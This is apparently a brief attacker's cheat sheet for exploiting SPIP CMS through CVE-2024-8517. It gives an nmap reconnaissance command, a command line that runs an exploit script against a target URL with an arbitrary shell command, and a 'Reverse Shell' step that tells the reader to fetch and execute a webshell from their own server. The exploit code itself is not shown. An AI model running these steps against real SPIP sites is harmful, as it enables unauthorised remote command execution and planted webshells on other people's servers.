# SPIP CMS Exploitation (CVE-2024-8517)

## NSE Check

nmap --script http-title -p80 <TARGET_IP>
Manual Exploit

python3 spip_8517.py http://<TARGET> "<CMD>"
Reverse Shell
Use payload to fetch and execute webshell from your server

